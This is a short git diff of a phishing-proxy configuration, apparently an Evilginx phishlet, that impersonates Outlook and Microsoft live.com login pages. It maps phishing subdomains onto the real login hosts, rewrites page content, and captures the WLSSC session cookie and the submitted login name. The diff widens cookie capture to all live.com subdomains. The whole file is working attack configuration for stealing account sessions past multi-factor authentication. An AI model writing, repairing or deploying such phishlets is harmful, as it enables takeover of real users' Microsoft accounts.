@@ -1,6 +1,6 @@
 name: 'outlook'
 author: '@mrgretzky'
-min_ver: '2.0.0'
+min_ver: '2.1.0'
 proxy_hosts:
   - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
@@ -16,7 +16,7 @@ sub_filters:
   - {hostname: 'account.live.com', sub: 'live', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {hostname: 'account.live.com', sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
-  - domain: 'live.com'
+  - domain: '.live.com'
     keys: ['WLSSC']
 user_regex:
   key: 'login'
